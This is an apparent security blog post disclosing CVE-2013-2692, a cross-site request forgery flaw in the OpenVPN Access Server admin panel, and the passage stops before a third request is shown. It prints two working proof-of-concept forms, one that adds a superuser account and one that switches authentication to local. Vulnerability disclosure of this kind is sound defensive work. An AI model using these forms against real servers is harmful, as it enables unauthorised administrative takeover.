		<h2 class="entry-title"><a href="http://ceriksen.com/2013/05/09/cve-2013-2692-or-when-your-openvpn-is-a-bit-too-open/" title="Permalink to CVE-2013-2692 &#8211; Or when your OpenVPN is a bit too open" rel="bookmark">CVE-2013-2692 &#8211; Or when your OpenVPN is a bit too open</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisories</strong></p>
<p><a href="http://openvpn.net/index.php/access-server/download-openvpn-as/531-release-notes-v185.html">OpenVPN</a></p>
<p><a href="http://secunia.com/advisories/52802">Secunia</a></p>
<p><strong>Details</strong></p>
<p>When analyzing the <a href="http://openvpn.net/index.php/access-server/download-openvpn-as-vm/164.html?osfamily=Virtual%20Appliance%20(VMWare)&amp;ex=1">OpenVPN Access Server</a>, it quickly became apparent that the administration interface lacked any basic level of CSRF protection, which was easily demonstrated with a CSRF form like this, which will add a new user with admin privileges, using the username &#8220;csrfaccount&#8221; and password &#8220;qweasd&#8221;:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987717a6bc195721140" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;form action="https://192.168.1.133/admin/user_permissions" method="POST" enctype="multipart/form-data"&gt;
  &lt;input type="hidden" name="search" value="&amp;#13;" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;openvpn&amp;#58;conn&amp;#95;group" value="None" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;openvpn&amp;#58;pvt&amp;#95;password&amp;#95;digest" value="&amp;#13;" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;openvpn&amp;#58;dynstatic" value="true" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;openvpn&amp;#58;conn&amp;#95;ip" value="&amp;#13;" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;openvpn&amp;#58;s2c&amp;#95;route&amp;#95;type" value="nat" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;openvpn&amp;#58;s2c&amp;#95;routes" value="&amp;#13;" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;openvpn&amp;#58;gwyesno" value="no" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;openvpn&amp;#58;c2s&amp;#95;routes" value="&amp;#13;" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;openvpn&amp;#58;dmzyesno" value="no" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;openvpn&amp;#58;dmz&amp;#95;ip" value="&amp;#13;" /&gt;
  &lt;input type="hidden" name="new&amp;#95;username" value="csrfaccount" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;conn&amp;#95;group" value="None" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;prop&amp;#95;superuser" value="true" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;pvt&amp;#95;password&amp;#95;digest" value="qweasd" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;dynstatic" value="true" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;conn&amp;#95;ip" value="&amp;#13;" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;s2c&amp;#95;route&amp;#95;type" value="nat" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;s2c&amp;#95;routes" value="&amp;#13;" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;gwyesno" value="no" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;c2s&amp;#95;routes" value="&amp;#13;" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;dmzyesno" value="no" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;dmz&amp;#95;ip" value="&amp;#13;" /&gt;
  &lt;input type="hidden" name="button" value="Save&amp;#32;Settings" /&gt;
&lt;/form&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987717a6bc195721140-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717a6bc195721140-2">2</div><div class="crayon-num" data-line="crayon-53c987717a6bc195721140-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717a6bc195721140-4">4</div><div class="crayon-num" data-line="crayon-53c987717a6bc195721140-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717a6bc195721140-6">6</div><div class="crayon-num" data-line="crayon-53c987717a6bc195721140-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717a6bc195721140-8">8</div><div class="crayon-num" data-line="crayon-53c987717a6bc195721140-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717a6bc195721140-10">10</div><div class="crayon-num" data-line="crayon-53c987717a6bc195721140-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717a6bc195721140-12">12</div><div class="crayon-num" data-line="crayon-53c987717a6bc195721140-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717a6bc195721140-14">14</div><div class="crayon-num" data-line="crayon-53c987717a6bc195721140-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717a6bc195721140-16">16</div><div class="crayon-num" data-line="crayon-53c987717a6bc195721140-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717a6bc195721140-18">18</div><div class="crayon-num" data-line="crayon-53c987717a6bc195721140-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717a6bc195721140-20">20</div><div class="crayon-num" data-line="crayon-53c987717a6bc195721140-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717a6bc195721140-22">22</div><div class="crayon-num" data-line="crayon-53c987717a6bc195721140-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717a6bc195721140-24">24</div><div class="crayon-num" data-line="crayon-53c987717a6bc195721140-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717a6bc195721140-26">26</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987717a6bc195721140-1"><span class="crayon-o">&lt;</span><span class="crayon-e">form </span><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-s">"https://192.168.1.133/admin/user_permissions"</span><span class="crayon-h"> </span><span class="crayon-v">method</span><span class="crayon-o">=</span><span class="crayon-s">"POST"</span><span class="crayon-h"> </span><span class="crayon-v">enctype</span><span class="crayon-o">=</span><span class="crayon-s">"multipart/form-data"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717a6bc195721140-2"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"search"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"&amp;#13;"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c987717a6bc195721140-3"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;openvpn&amp;#58;conn&amp;#95;group"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"None"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717a6bc195721140-4"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;openvpn&amp;#58;pvt&amp;#95;password&amp;#95;digest"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"&amp;#13;"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c987717a6bc195721140-5"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;openvpn&amp;#58;dynstatic"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"true"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717a6bc195721140-6"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;openvpn&amp;#58;conn&amp;#95;ip"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"&amp;#13;"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c987717a6bc195721140-7"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;openvpn&amp;#58;s2c&amp;#95;route&amp;#95;type"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"nat"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717a6bc195721140-8"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;openvpn&amp;#58;s2c&amp;#95;routes"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"&amp;#13;"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c987717a6bc195721140-9"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;openvpn&amp;#58;gwyesno"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"no"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717a6bc195721140-10"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;openvpn&amp;#58;c2s&amp;#95;routes"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"&amp;#13;"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c987717a6bc195721140-11"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;openvpn&amp;#58;dmzyesno"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"no"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717a6bc195721140-12"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;openvpn&amp;#58;dmz&amp;#95;ip"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"&amp;#13;"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c987717a6bc195721140-13"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"new&amp;#95;username"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"csrfaccount"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717a6bc195721140-14"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;conn&amp;#95;group"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"None"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c987717a6bc195721140-15"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;prop&amp;#95;superuser"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"true"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717a6bc195721140-16"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;pvt&amp;#95;password&amp;#95;digest"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"qweasd"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c987717a6bc195721140-17"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;dynstatic"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"true"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717a6bc195721140-18"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;conn&amp;#95;ip"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"&amp;#13;"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c987717a6bc195721140-19"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;s2c&amp;#95;route&amp;#95;type"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"nat"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717a6bc195721140-20"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;s2c&amp;#95;routes"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"&amp;#13;"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c987717a6bc195721140-21"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;gwyesno"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"no"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717a6bc195721140-22"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;c2s&amp;#95;routes"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"&amp;#13;"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c987717a6bc195721140-23"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;dmzyesno"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"no"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717a6bc195721140-24"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;dmz&amp;#95;ip"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"&amp;#13;"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c987717a6bc195721140-25"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"button"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"Save&amp;#32;Settings"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717a6bc195721140-26"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">form</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0151 seconds] -->
<p>For this to be effective, we need to ensure that the server is configured to use &#8220;Local&#8221; authentication. This means OpenVPN controls the authentication, rather than using PAM/RADIUS/LDAP. We can do this with these two simple requests:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987717a6ce907623303" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;form action="https://192.168.1.133/admin/authentication_general_configuration" method="POST" enctype="multipart/form-data"&gt;
  &lt;input type="hidden" name="auth&amp;#46;module&amp;#46;type" value="local" /&gt;
  &lt;input type="hidden" name="button" value="Save&amp;#32;Settings" /&gt;
&lt;/form&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987717a6ce907623303-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717a6ce907623303-2">2</div><div class="crayon-num" data-line="crayon-53c987717a6ce907623303-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717a6ce907623303-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987717a6ce907623303-1"><span class="crayon-o">&lt;</span><span class="crayon-e">form </span><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-s">"https://192.168.1.133/admin/authentication_general_configuration"</span><span class="crayon-h"> </span><span class="crayon-v">method</span><span class="crayon-o">=</span><span class="crayon-s">"POST"</span><span class="crayon-h"> </span><span class="crayon-v">enctype</span><span class="crayon-o">=</span><span class="crayon-s">"multipart/form-data"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717a6ce907623303-2"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"auth&amp;#46;module&amp;#46;type"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"local"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c987717a6ce907623303-3"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"button"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"Save&amp;#32;Settings"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717a6ce907623303-4"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">form</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0021 seconds] -->
<p>When we have changed the authentication method, we need to commit the change:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987717a6d8465380388" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
